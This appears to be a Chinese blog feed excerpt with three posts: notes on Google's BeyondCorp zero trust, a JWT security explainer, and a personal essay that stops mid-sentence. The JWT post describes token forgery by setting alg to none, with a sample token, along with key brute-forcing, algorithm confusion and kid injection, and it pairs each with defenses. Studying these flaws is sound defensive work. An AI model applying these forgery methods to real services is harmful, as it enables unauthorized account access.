时需要认证，访问办公系统时再需要认证，可能还需要二次认证，对体验和研发效能影响较大。并且这种流程是对应用捆绑，每个人要用都必须这么来，实际上并不是所有人在所有时候进行的操作，都需要二次认证。</p><p>现在研发流程提效的问题在每个公司都很受关注，如果安全成了提效的最大阻碍，出师无名，就很难推行了。</p><h3 id="可以得到那些经验">可以得到那些经验？</h3><p>那么还有一部分是比较值得说的就是这个经验。谷歌那 6 篇论文不仅说了他们是如何做的，还说了非常多落地经验，实在是业界良心。不过实在是太多了，而且很多经验如果没有参与落地的话，橘友们不会直接接触到，也没啥感觉。</p><p><strong>“不仅仅是解决技术层面的问题”</strong></p><p>这里的经验其实不仅是技术层面的，也有运营、运维等等。当然，还有很多这样的经验，篇幅关系我就不一一列出了。</p><ul><li>分阶段上线实施是迁移能成功的关键</li><li>资产管理的数据质量问题可能导致设备无意中失去对企业资源的访问权限</li><li>假设企业内部网络与公共互联网一样充满危险，并基于这种假设构建企业应用</li><li>着手迁移到一个类似 BeyondCorp 的模型之前，需要来自公司高层及其他负责人的支持</li><li>在部署 BeyondCorp 的过程中，面临的最大挑战之一是如何在不干扰用户的情况下完成如此大规模的任务</li><li>为了避免出现海量问询，需要尽量减少员工困惑，并在无需技术人员人工干预的情况下能够对常见问题进行回答</li><li>为了防止临时例外变成常态甚至颠覆 BeyondCorp 的基本目标，只有给出明确计划时，我们才允许进行临时的例外放行</li><li>灾难性的突发事件甚至可能导致支持人员都无法访问恢复所需的工具和系统，因此 BeyondCorp 系统中构建了各种故障保护系统</li><li>团队还组织内部宣传活动来提高大家对 BeyondCorp 的认识，比如推出了电脑贴纸、标识和口号，还在办公室张贴随处可见的文章</li></ul><p><strong>“前人的经验不但可以教会我们应该做什么，也可以提醒我们不要做什么”</strong></p><p>其实前人的经验不但可以教会我们应该做什么，也可以提醒我们不要做什么。</p><ul><li>不要盲目地相信单个或少量系统的数据真实性</li><li>沟通不足会让用户感到惊讶和困惑，造成补救措施效果差，IT 支持人员的工作也会超负荷</li><li>过度沟通也有问题：不愿改变的用户会倾向于高估变化带来的影响并企图寻求不必要的豁免</li><li>一下子将每个网络用户和每个应用都迁移到 BeyondCorp 环境，对业务连续性来说非常危险</li><li>一开始只打算支持 HTTP 协议是完全不够的，随着项目的推进， 不得不为更多的协议提供支持</li><li>例外处理增加了 BeyondCorp 生态系统的复杂性，随着时间的推移，“为什么我的访问被拒绝了?” 这个问题的答案已经不那么明了</li><li>尽管新员工在培训中了解了 BeyondCorp，但他们在入职头几天中可是接受了大量的信息冲击，让每个人都能回忆起培训中的每个细节不太现实</li></ul><p>最后这一点，各位在入职的前几天应该是非常感同身受的。似乎我们所有的流程或者是培训，都默认你会记住他们给的知识点。但是这就和以前老师布置作业一样，每个老师都说自己布置了一点点作业，每个老师都一点点，其实加起来可能就变得很多。</p><h2 id="结尾">结尾</h2><p>谷歌 BeyondCorp 的介绍就到此结束啦。还有很多很多的细节，再次推荐各位去看看谷歌的这六篇论文（见资料 2），非常值得研读。</p><p>这里放上我整理的思维导图（此图较大），起到一个总结的作用：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/zero-trust-1/20211210135937.png!blog" /></p><p>其实我感觉，学习一个新的技术项目，最好的办法就是投入时间去参与它的落地过程，否则还是有点云，因为很多事情不参与是没有切身体会的。</p><p>我最近在做办公网零信任的建设，如果你有相关经验或者问题，非常欢迎联系我，我们可以交换一下建设经验，提升彼此的安全水位，开门造车，合作共赢。</p><h2 id="资料">资料</h2><ol type="1"><li>《网络安全先进技术与应用发展系列报告 零信任技术》<ul><li>公众号后台回复：bt-1</li></ul></li><li>BeyondCorp 中文版论文<ul><li>公众号后台回复：bt-2</li></ul></li></ol><br><p style="text-align: center;"><font size="2px" color="gray">以零信任，重建信任<br>我们下一篇见！</font><br /><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;零信任其实是一种安全理念：“永不信任，始终验证”。&lt;/p&gt;</summary>
    
    
    
    <category term="经验总结" scheme="https://www.tr0y.wang/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="安全建设" scheme="https://www.tr0y.wang/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
  </entry>
  
  <entry>
    <title>SecMap - JWT</title>
    <link href="https://www.tr0y.wang/2021/10/22/SecMap-JWT/"/>
    <id>https://www.tr0y.wang/2021/10/22/SecMap-JWT/</id>
    <published>2021-10-22T20:00:00.000Z</published>
    <updated>2023-05-04T09:44:57.352Z</updated>
    
    <content type="html"><![CDATA[<p>SecMap 系列之 JWT</p><span id="more"></span><p>SecMap 系列停止更新有一段时间了，年初立的 Flag 不能倒！</p><h2 id="介绍">介绍</h2><h3 id="jwt-的理解">JWT 的理解</h3><p>JWT(Json Web Token) 是一个非常轻量级的规范。它本质上是一个 token，这个 token 我们理解为 <code>访问资源的凭据</code> 即可，即它是一种基于 Token 的会话管理方案。JWT 一个很重要的特点就是，如果要想确认它是否有效，我们只需要看 JWT 本身的内容就可以验证了。</p><p><strong>由于 JWT 的使用场景主要还是在认证上，所以本文就不多啰嗦其他场景了。</strong></p><p>那在 JWT 之前，我们是怎么做访问资源凭据的验证呢？答案是 cookie-session 机制。对于 cookie-session 这一套我们是比较熟悉的，那 JWT 认证的流程是什么样的呢？</p><p>别着急，先来看一个常见的误区。</p><p>首先，JWT 标准（见资料 1）中是这么说的：<br /><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">...<br>The claims in a JWT are encoded as a JSON object <br>that is used as the payload of a JSON Web Signature (JWS) <br>structure or as the plaintext of a JSON Web Encryption (JWE) structure<br>...<br></code></pre></td></tr></table></figure></p><p>所以，<strong>你可以这么说，一个 JWT 要么是一个 JWE，要么是一个 JWS，而我们常说的 JWT 其实特指的是 JWS。</strong></p><p><strong>所以为了严谨，下文将严格区分它们。如果提到了 JWT 的话，那就是指的 JWS + JWS。</strong></p><p>那么什么是 JWS、JWE 呢？</p><h4 id="jws-的理解">JWS 的理解</h4><p>JWS（JSON Web Signature）它其实就是一个 JSON，由 3 个字段组成，每个字段都需要经过 url 编码 + Base64Url 编码。它们之间用 <code>.</code> 连接：<br /><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">base64.urlsafe<span class="hljs-constructor">_b64encode(<span class="hljs-params">header</span>)</span> + <span class="hljs-string">&quot;.&quot;</span> + <br>base64.urlsafe<span class="hljs-constructor">_b64encode(<span class="hljs-params">payload</span>)</span> + <span class="hljs-string">&quot;.&quot;</span> + <br>base64.urlsafe<span class="hljs-constructor">_b64encode(<span class="hljs-params">signture</span>)</span><br></code></pre></td></tr></table></figure></p><ol type="1"><li><code>header</code>: 记录 JWT 本身的一些信息，包含以下键<ol type="1"><li><code>typ</code>: token 类型，这个值是写死的，就是 <code>JWT</code>，它的作用在于出现嵌套的时候，可以识别出哪一层的 json 是个 JWS</li><li><code>alg</code>: 签名算法（比如 HMAC 类: <code>HS256</code>等、RSASSA 类: <code>RS256</code>、ECDSA 类<code>ES256</code>等、<code>none</code>）。相信各位在小学六年级就知道了，这里的签名算法都是要用到密钥的。</li><li><code>cty</code>: 可选，比较少见，如果这个 JWS 包含另一个 JWS 的话（注意与 typ 的区别），它就需要置为 <code>JWT</code></li><li><code>jwk</code>: 可选，JSON Web Key, 当签名算法所用的密钥有很多个的时候（比如有一个统一提供 JWT 认证的服务，有很多应用接入），服务端在校验 JWT 的完整性时不知道要用哪一个私钥进行验证，有了这个键之后就知道之前颁发 JWT 的时候用的是哪个公钥了。这里的 jwk 需要按照资料 5 的规范，也是一个 json，里面有它自己的键，感兴趣的话可以自行查看 rfc，这里就不赘述了。</li><li><code>kid</code>: 可选，jwk 的编号，如果签名算法所用的密钥很多的话（同上面的情况），可以通过这个标识来判断/查询用的是哪一个密钥。它与 jwk 有类似的作用。如果同时出现 kid 和 jwk 那么 kid 的含义是标识用的是哪个 jwk。</li><li><code>jku</code>/<code>x5u</code>/<code>x5c</code>/<code>x5t</code>/<code>x5t#S256</code>/<code>crit</code>: 这些用得少就不赘述了，见 rfc 文档即可。</li></ol></li><li><code>payload</code>: JWT 标准将 Payload 中的键称为 JWT 声明（claims），有以下 3 类：<ol type="1"><li>JWT 标准预定义了一些声明，不强制但建议使用，叫 <code>registered claims</code>，包含：<ol type="1"><li><code>iss</code>: Issuer, 签发人</li><li><code>sub</code>: Subject, 主题</li><li><code>aud</code>: Audience, 使用对象</li><li><code>exp</code>: Expiration Time, 到期时间，到达或者超过到期时间的应当拒绝处理</li><li><code>nbf</code>: Not Before, 在此时间之前的应当拒绝处理</li><li><code>iat</code>: Issued At, 签发时间</li><li><code>jti</code>: JWT ID, JWT 的唯一标识符</li></ol></li><li>如果你想自定义一个类似 <code>registered claims</code> 这种申明，有两种选择，要么去 IANA JSON Web Token Registry 中注册（见资料 2），要么取一个不太会被用到的名字（防止重复），比如加上你的域名前缀。这种叫 <code>public claim</code>。我也没懂为啥会有这种需求，我的理解是这玩意自定义之后，可能是给一整个组织去使用的，算是一种定制化的 JWT 规范。</li><li>最后，大多数键都是开发自定义的（比如身份信息等等），这个叫 <code>private claims</code>，需要注意的是这里的键名不要覆盖了上面两种键名，比如 exp 就是过期时间，不能把它当做用户名来用。当然如果服务端和客户端约定好了，非要这么干，那也不是不行，只是很不符合规范。</li></ol></li><li><code>signture</code>: 根据指定的算法，用密钥对 header + payload 进行签名，用于校验 JWS，避免 伪造/篡改</li></ol><p>最后有必要说明的是，我们常用的 JWS 其实是紧凑模式。相比之下还有一种通用模式和紧凑通用模式，它们的区别是什么呢？</p><ul><li>紧凑模式是经过 Base64Url 编码的，它只有一个数字签名，用来保护 header+paylaod</li><li>通用模式提供了单独保护某一个 header 键的能力，但是它不经过 Base64Url 编码：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-JWT/16b9cbe4-8bfe-477a-8ae3-e3ec809e8ef6.png!blog" /></li><li>紧凑通用模式就是在通用模式上增加了一步 Base64Url 编码</li></ul><h4 id="jwe-的理解">JWE 的理解</h4><p>由于 JWS 只对整个 json 做了签名，其中 paylaod 还是明文的，Base64Url 解开就行。那如果我不想让别人看里面的内容怎么办呢？就可以用 JWE。</p><p>JWE（JSON Web Encryption）也是一个 json，由 5 个字段组成，每个字段都需要经过 url 编码 + Base64Url 编码。它们之间用 <code>.</code> 连接：<br /><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">base64.urlsafe<span class="hljs-constructor">_b64encode(<span class="hljs-params">header</span>)</span> + <span class="hljs-string">&quot;.&quot;</span> + <br>base64.urlsafe<span class="hljs-constructor">_b64encode(JEK)</span> + <span class="hljs-string">&quot;.&quot;</span> + <br>base64.urlsafe<span class="hljs-constructor">_b64encode(JIV)</span> + <span class="hljs-string">&quot;.&quot;</span> + <br>base64.urlsafe<span class="hljs-constructor">_b64encode(Ciphertext)</span> + <span class="hljs-string">&quot;.&quot;</span> + <br>base64.urlsafe<span class="hljs-constructor">_b64encode(Tag)</span><br></code></pre></td></tr></table></figure></p><ol type="1"><li><code>header</code>: 与 JWS 基本一致，但是有几个键不一样<ol type="1"><li><code>alg</code>: 算法名称，该算法用于下面的 JEK</li><li><code>enc</code>: 算法名称，用于加密 payload</li><li><code>zip</code>: 可选，在加密前压缩数据的算法</li></ol></li><li><code>JEK</code>: JWE Encryption Key，它是由随机生成的 CEK(Content Encryption Key) 通过加密得到的，至于是哪个加密算法，就是由 alg 指定的。这个 CEK 后面要用于加密 payload。</li><li><code>JIV</code>: JWE Initialization Vector，初始的 IV，有些加密方式需要这玩意</li><li><code>Ciphertext</code>: 对 payload 加密后的数据。</li><li><code>Tag</code>: 就是 Authentication Tag，加密算法产生的附加数据，用于保护密文的完整性</li></ol><p>与 JWS 类似，JWE 也有三种模式：紧凑模式、通用模式和紧凑通用模式。</p><p>最后举个例子来看一下 JWE 的加密过程，我觉得一图胜千言（紧凑模式）：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-JWT/2cea9f09-0a13-48f5-ab4c-fcdc09738d3c.png!blog#width-zoom8" /></p><h3 id="jwt-认证流程">JWT 认证流程</h3><ol type="1"><li>用户向服务器提交用户名和密码，服务器验证是否正确</li><li>如果校验正确，服务器创建一个 JWT，发回给客户端（JWE 的话会有解密过程）</li><li>浏览器获取到经过签名的 JWT，然后在之后的每个请求中都会附带 JWT</li><li>服务器在每收到一次请求都会校验 JWT，检查 JWT 签名，确保这个是自己签发的（如果是 JWE 的话会有解密过程）。</li><li>没有问题的话，返回响应</li></ol><p>非常好理解，其实就是服务端在验证身份之后，会给你发一个 token，然后之后你所有的请求都带上这个 token，服务端就知道是你了。</p><h3 id="优缺点">优缺点</h3><p>那么 JWT 什么好处呢？</p><ol type="1"><li>非常明显的一点就是，它的可扩展性很好。现在很多应用是分布式部署的，如果是基于 session 去做的认证，那么就需要做数据共享（至少得保证 session 是一致的），做法可以是存在数据库或者缓存队列（比如 redis）里面。但是 JWT 不需要，因为手握密钥的服务器只要有 JWT 就可以验证它是否合法。</li><li>无状态 —— JWT 不在服务端存储任何状态。RESTful API 的原则之一就是无状态。这里的“无状态”，很多人有不同的说法，我觉得意会一下就好了。论文的原文是 “such that each request from client to server must contain all of the information necessary to understand the request, and cannot take advantage of any stored context on the server.”。所以我们会发现 JWT 是很符合 RESTful 要求的</li><li>抗 csrf —— 毕竟连 cookie 都没有了对吧。</li><li>JWT 的 payload 中可以简单存储一些常用信息，取起来比较方便。</li></ol><p>那么 JWT 什么坏处呢？</p><ol type="1"><li>通信的开销大。如果 JWT 的 payload 里存放了大量的数据，那么整个 JWT 就会很长（别忘了它还要经过 base64Url 编码）。而单个 cookie 是有大小限制的，一般是 4k 左右，所以 cookie 很可能放不下。因此 JWT 一般是放在 Header 里面发送，存储的话会放在 local storage 里面。而对比之前的 cookie-session，SessionId 要短的多。</li><li>JWT 一旦签发，无法修改。这对应以下 3 个问题：<ol type="1"><li>数据有改动时会出现不一致的问题。假设 JWT 中存储了用户名，当用户将姓名修改之后，JWT 里的用户名就会和数据库里保存的用户名不一致。这个时候一个很直接的想法就是我们重新签发一个 JWT 就行，但是旧的 JWT 还没过期呢，这个旧的 JWT 依旧可以用于登录，那登录后服务端从 JWT 中拿到的信息就是过时的。那么怎么把旧的 JWT 弄失效呢？这就变成了下面这个问题。</li><li>要把一个 JWT 变成失效状态，只能等它到期。比如退出登录这种场景，cookie-session 只需要服务端删掉相关的 session 就行；而原生的 JWT 是无法实现这个功能的。如果你非得用 JWT 实现这个功能，那么常见的有以下几种方案：<ol type="1"><li>一种方案是用户在点击退出的时候，客户端配合删除本地存储的 JWT。这种方案原理上行得通，但是服务端对这个过程是不可控的，只能祈祷客户端只有一个并且它成功删除了 Cookie。</li><li>另一种方案是设置有效期较短的 JWT，但是这又会导致用户需要频繁登录（体验上的问题）。并且就算 JWT 有效期再短，距离用户点击“退出登录”和它失效之间肯定也是有一个窗口期的。</li><li>另另一种方案是额外部署一个组件用于存储状态，比如在 redis 中设置一个黑名单，签发了新的 JWT 之后就把旧的就加入黑名单，避免被再次使用，最后等到期了再在 redis 中删除即可。但这不就是有状态吗？它违背了 JWT 的初衷，并且和基于 cookie-session 的方案已经相差无几了。</li><li>另另另一种是基于 refresh token 的方案，我感觉是对方案 3 的优化。这种方案就是在客户端登录之后，额外颁发一个 Refresh token（有效时间长），来后续获取 JWT（有效时间短）。当客户端访问需要认证的接口时，先携带 JWT 发起访问，服务端校验是否过期，如果没有，那么鉴权通过后，返回成功的响应；如果 JWT 过期或者鉴权失败，则返回失败的响应，客户端这时需要使用 Refresh Token 来申请新的 JWT，如果 Refresh Token 没有过期，服务端鉴权通过后向客户端下发新的 JWT，客户端后续用这个新的 JWT 就可以了；如果 Refresh Token 也过期了那就引导用户去重新登录来获取新的 Refresh Token。由于 Refresh Token 不会在客户端请求业务接口时验证，只有在申请新的 JWT 时才会验证，所以相比方案 3，降低了服务端各个组件在响应时间上的压力。当登出或禁用用户时，只需要将 Refresh Token 删除，用户就会在 JWT 过期后，由于无法获取到新的 Access Token 而再也无法访问。这样的方式虽然还是会有一定的窗口期（需要等 Access Token 过期，不过相比方案 2 已经缓解了很多），但是结合方案 1，还算实用了。</li></ol></li><li>本文的重点内容：当 JWT 使用不当的时候，存在的安全问题。</li></ol></li></ol><p>综上，我对 JWT 的看法是，没有银弹。你不能期望它解决所有认证问题。在使用 JWT 的时候，是否适合用它是需要仔细思考的，每种方案都有它的好、坏与适配的场景，我们在合适的场景下选择合适的方案就行了，不要执着于使用 JWT。</p><h2 id="攻击思路">攻击思路</h2><p>由于 JWE 的使用场景实在是太少了，我也没见过，所以下面就说 JWS 吧，等我遇到了再补上。</p><p>JWS 的安全性全靠签名，所以大部分攻击场景都是针对签名的。</p><h3 id="信息泄露">信息泄露</h3><p>JWS 的 header 和 payload 都只经过简单的编码，所以不应该存放敏感数据。根据我的经验，现在其实还是有不少人认为 base64 是“加密算法”，如果是这么认为的那就很有可能将敏感信息放在里面，导致信息泄露。</p><h3 id="爆破签名密钥">爆破签名密钥</h3><p>只要你拥有密钥，那么你就可以构造任意内容的合法的 JWS。所以最直接的思路就是拿到一个 JWS 之后爆破它的签名密钥，这个过程还是离线的，所以速度会比较快。</p><p>所以密钥空间一定要足够大。</p><h3 id="签名算法置为-none">签名算法置为 none</h3><p>上面提到 header 中有个键是 <code>alg</code>，用于标识 signature 的签名算法。而其中有一个值是 <code>none</code>，它是 JWT 规范中强制要求实现的（<code>...only HMAC SHA-256 ("HS256") and "none" MUST be implemented by conforming JWT implementations...</code>）。其实我不太理解为什么要加这个值。</p><p>所以在自己实现 JWT 的时候，如果没有注意到这种特殊情况（可能有些库的实现也有问题，不过目前我还没找到），攻击者就可以设置 alg 为 none，这样 paylaod 就可以随便伪造了。</p><p>比如：<br /><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">payload</span> = &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Tr0y&quot;</span>,<br>&#125;<br></code></pre></td></tr></table></figure><br />它的 JWS 是 <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJuYW1lIjoiVHIweSJ9.</code></p><p>我们将 name 改为 <code>admin</code> 也可以通过验证。</p><p>那我们应该怎么处理这种情况呢？如果我们认为所有算法是 none 的 JWS 都是不合法的，那么按照 rfc 文档的规定，这样粗暴地处理其实是不符合标准的，虽然我也感觉真的有这个需求的人应该特别特别少。</p><p>我们可以参考 Python 的第三方库 <code>pyJWT</code> 的实现：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-JWT/b2d8e6e5-78dd-48ef-b4ca-34c95df82274.png!blog" /></p><p>默认情况下，只要你的算法是 none，验签的时候直接一棍子打死。但是你可以加上一个参数来使用，这里附上 pyJWT 作者的吐槽：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-JWT/ff358d7b-bb7f-4c56-ade2-53a02d556e45.png!blog" /></p><p>可以说是很豹笑了。我觉得这个做法不但比较安全，还符合 rfc 规范（可以让你这么用，但是你必须额外设置一个参数），值得我们学习。</p><h3 id="签名算法从非对称类型改为对称类型">签名算法从非对称类型改为对称类型</h3><p>这种情况本质上是服务端没有校验算法与密钥是否属于同一种类型的组合。</p><p>场景：服务端只使用了 HS256 来做签名算法。那么自然就是用私钥签名，公钥验签。</p><p>假设条件：服务端没有校验收到的 JWS header 里的算法是不是自己采用的算法，而是直接采用 JWS 里的算法来验签，且认为算法应该是 RS256（脑子里想的是要用 RS256 算法，手上却用了 JWS 里的算法，至于密钥？那当然用的是 RS256 的公钥了）。</p><p>那么攻击者可以构造一个 JWS，算法为 HS256，利用公开的公钥作为签名密钥，那么就可以通过验签了。因为服务端会把算法设定为 HS256，而此时验证签名的密钥就是公钥。</p><p>那么怎么避免这个问题呢？</p><ul><li>校验收到的 JWS 中的算法自己有没有使用，如果没有使用的话直接干掉。</li><li>如果没有多种算法的话，不要采用 JWS 里的算法</li><li>如果有多种算法（我觉得这种情况下出这个漏洞的可能性较低，因为肯定是有多个密钥的），那么密钥一定要保证与算法是一一配对的（这个大多数情况下也不会有问题）</li></ul><p>另外，有些库是禁止 HMAC 使用非对称加密的密钥的，比如 pyJWT:<br /><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jwt.exceptions.InvalidKeyError: </span><br>The specified key is an asymmetric key <br><span class="hljs-keyword">or </span>x509 certificate <br><span class="hljs-keyword">and </span><span class="hljs-keyword">should </span>not <span class="hljs-keyword">be </span>used as an HMAC secret.<br></code></pre></td></tr></table></figure></p><h3 id="kid-设计问题">kid 设计问题</h3><p>这种大多出现在 CTF 上。</p><p>当 JWS 的密钥很多的时候，可以通过 kid 来确定使用哪个密钥。如果 kid 的相关逻辑存在问题的话，就会出现安全问题。</p><blockquote><p>任意文件上传 + 可通过 kid 指定特定路径下的密钥</p></blockquote><p>例子：2017 HITB CTF: Pasty</p><blockquote><p>SQL 注入</p></blockquote><p>例子：2021 年网鼎杯的玄武组 Web 题: js_on</p><h2 id="资料">资料</h2><ul><li>资料 1: rfc7519, https://datatracker.ietf.org/doc/html/rfc7519</li><li>资料 2: IANA "JSON Web Token Claims", https://datatracker.ietf.org/doc/html/rfc7519#section-10.1</li><li>资料 3: JWE, https://datatracker.ietf.org/doc/html/rfc7516</li><li>资料 4: JWS, https://datatracker.ietf.org/doc/html/rfc7515</li><li>资料 5: JWK, https://datatracker.ietf.org/doc/html/rfc7517</li></ul></br><p style="text-align: center; font-weight: bolder"><font size="2" color="gray">其实 JWT 相关的知识点还有一些<br>但是不太常用<br>（看 rfc 文档真的是太痛苦了...）<br>橘友们可以慢慢研究<br>我就先看到这</font><br /><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;SecMap 系列之 JWT&lt;/p&gt;</summary>
    
    
    
    <category term="经验总结" scheme="https://www.tr0y.wang/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="Web" scheme="https://www.tr0y.wang/tags/Web/"/>
    
    <category term="SecMap" scheme="https://www.tr0y.wang/tags/SecMap/"/>
    
  </entry>
  
  <entry>
    <title>一程山路</title>
    <link href="https://www.tr0y.wang/2021/09/18/%E4%B8%80%E7%A8%8B%E5%B1%B1%E8%B7%AF/"/>
    <id>https://www.tr0y.wang/2021/09/18/%E4%B8%80%E7%A8%8B%E5%B1%B1%E8%B7%AF/</id>
    <published>2021-09-18T11:13:31.000Z</published>
    <updated>2023-05-04T09:44:57.360Z</updated>
    
    <content type="html"><![CDATA[<p>潺潺流水终于穿过了群山一座座</p><span id="more"></span><p>好久不见！</p><h2 id="旧的结束">旧的结束</h2><p>距离上一篇文章发布，已经快三个月了，看着年初立下的 flag，有点惭愧。不过最近确实有很多事情需要我想与做，所以也不算浪费时间啦。现在终于尘埃落定了，接下来准备继续按照预定的计划学习和写我的文章。</p><p>今天这一篇呢，不聊技术，来分享一下我在这三个月中的思考与感悟。<strong>仅仅是个人观点，请勿开箱即用</strong></p><h2 id="决策">决策</h2><p>因为最近一直在想事情、做了很多重要的决定、对未来也有了更进一步的规划，空闲的时间基本上都在琢磨来琢磨去，所以有种脑袋塞满想法的感觉。我想是时候整理一下，腾出点空间让自己好好放松一下，然后我获得了下面这些做决策的经验，我觉得相比后面的那些胡侃来说，这一段要重要得多。</p><ol type="1"><li>明确自己想要的是什么，一切都是为了这个终极目标。如果有一个选择能让我 “比较容易地达到我的目标，但是我会过的不太爽”，另一个是让我 “比较困难地达到我的目标，但是我会过的很爽”。那么爽不爽重要吗？我不清楚，但是一定是低权重的。</li><li>明确达到目标需要作出多少个选择。有时候为了达到自己的目标，可能需要做多个决定。如果这些决定互不影响，那么对于这些决定就应该分开考虑，先作出第一个决定，再作出第二个决定，揉在一起思考难度会大很多。</li><li>舍去是为了得到。对于第 1 点，如果我的终极目标就是不仅要达到目标，还要舒舒服服地，但是现实就是不允许，所以我开始烦躁。那怎么办呢？不能怎么办，舍去是为了得到。</li><li>考虑一个选择的理由时，尽量避免情绪上的影响。寻得平静才能寻得自我，烦躁、慌乱、不安的时候，没关系的，正是因为这样才需要好好地思考，选择很少有绝对的对与错，如果有，那么你早就作出决定了。找上朋友出门走走，等静下心来再好好想想。</li><li>尽可能列出每个选择所有的优点和缺点。很多优缺点在本质上是一致的，尤其是对缺点的合并，可以降低思考的负担，也可以让你在完成第 6 点的时候效率更高。</li><li>尽量多找人交流，但前提是自己已经好好思考过了。一个人的思考角度是非常非常有限的，不仅体现在考虑问题的角度，还会体现在考虑问题的高度。找同样经历的人交流，可以修正同一个层面下的想法；找经验比你丰富的人交流，可以看到很多在你目前经历下看不到的东西，格局是真的可以感受到差距的。不要害怕丢脸，韩愈的《师说》建议多读几遍。但是如果你没有自己好好思考过，很容易直接被别人的想法影响，从而忽略了内心真实的想法。</li><li>记住小马过河的故事。任何人的建议都是参考，是辅助你做出决策的，每个人的能力不一样，别人说选 A 好、选 B 好或者说都一样，那是对别人来说是这样，对你来说也一样吗？所以在进行第 6 点的时候，“别人为什么这么想” 要比 “别人是怎么想的” 更加重要，结合自己的情况，有取舍地去吸收别人的想法，辅助自己做出决定。</li><li>做出选择之前，一定要有一个理由。这个理由必须是经过仔细思考得到的，所以如果是错的也没有关系，因为这意味着你还有机会修正自己的想法；如果毫无理由地就做出一个决定，或者随便想了个理由就开冲了，那就是在赌，赌对了还好，赌错了是没办法修正自己思维缺陷的，因为根本就没有理由。同时，注意第 4 点带来的影响。</li><li>做决定一定是附带成本的。所以如果保持现状也是一种选择，并且实在想不明白的话，那就暂时保持现状。</li><li>做出决定后就别再想另一个决定了。选 A 可能没有选 B 好，那又如何呢？只是可能而已，但是当下却是实实在在可以把握的，让后悔的情绪把现在可以确定的局面变糟，那就太亏了。</li></ol><p>这段时间所有的重要决定我都是按照这个流程去思考的，同时也很开心辅助了一些朋友去看清形势，做出他们的决定。有意思的是，很多时候想明白第一点就已经足够了 :)</p><h2 id="跳槽">跳槽</h2><p>跳槽是我这段时间做出的最重要的决定之一。但是因为种种原因，我不打算分享我遇到的具体情况，所以这里只能分享一些我的看法。</p><p>我曾经在网上看到过，马云说员工的离职原因有很多，归根结底就两点最真实：钱没给到位、心委屈了。我挺赞同的，再拓展一下其实就是：</p><ol type="1"><li>内部环境的斥力（心委屈了）</li><li>外部环境的引力（钱没给到位）</li></ol><p>我在跳槽之前找了很多朋友聊过这个事情，见过仅仅因为第一点就跳的，觉得领导 pua，同事甩锅；也见过仅仅因为第二点跳的，涨幅很高，平台很大。但我认为这两点需要同时满足才考虑跳，如果单纯是为了其中一点，你以为是跳槽，其实比较大概率是跳坑。</p><p>对于内部环境的斥力来说，在这家公司遇到的问题，很有可能在其他公司也会遇到，小公司有小公司的毛病，大公司也有大公司的通病，想通过跳槽刷新一下环境，祈祷不要遇到类似的问题，很容易翻车。重开一局就一定好吗？我想也不一定，不如先想想有没有办法解决这些问题，再走也不迟。</p><p>对于外部环境的引力来说，不同的平台之间确实会有发展的差异，我认为是否符合职业规划才是最重要的（去这家公司做什么？是否有能力做？环境支持能做到什么样？等等）。不仅是考虑是否要跳槽的时候需要考虑，当接到了多个 offer 的时候，也是需要考虑这个问题的。并且平台好并不意味着自己发展就好，忽视平台光环对自己的加成，会对自己的情况产生高估。在大平台容易被当做螺丝钉，但是技术积累深，可以看到更深的东西；在小平台杂活多且浅，但是切换自由灵活，可以接触到更多的东西，有时候甚至做什么都是自己说的算。那么你到底是只能从公司派的活里面学到东西呢？还是可以自己主动去通过接触公司的各种项目、观察内部情况来挖掘到一些东西从而提升自己呢？</p><p>所以跳槽前，不妨好好想想，到底是为了解决问题，还是为了逃避问题？</p><h2 id="坚持">坚持</h2><p>很有意思的是，我见过很多人在“坚持”的标准上，对自己都太过于苛刻了。</p><p>怎么说呢？人们常说，一件事情只要你坚持做 n 天，那么你就会把它变成一个习惯，一旦变成习惯之后呢，后面就自然而然会去做的。有道理，但是问题在于 “坚持做” 的标准是什么？</p><p>很多时候，我们会把 “坚持做” 想成是 “每天做”，然后只要计划被打断一次，就立马熄火。</p><p>常常会有人问我博客写了多久了，我说从 16 年开始写的，然后对方就会说哇你坚持了这么多年！但是如果你去看我博客的时间线，你会发现我并没有每天都写，甚至没有每个月都写，但是可能会集中在某段时间里突然发了好几篇，有的写我就写，没得写我就不写。那么这样的话，你还觉得我这是坚持写文章吗？</p><p>也正是因为这样，写博客对我来说是一件很快乐的事情，我不会因为一周没有写文章就认为我没有坚持在做这个事情，觉得难以坚持而放弃。但并不是所有人都和我这样是低标准的坚持，有些人会说 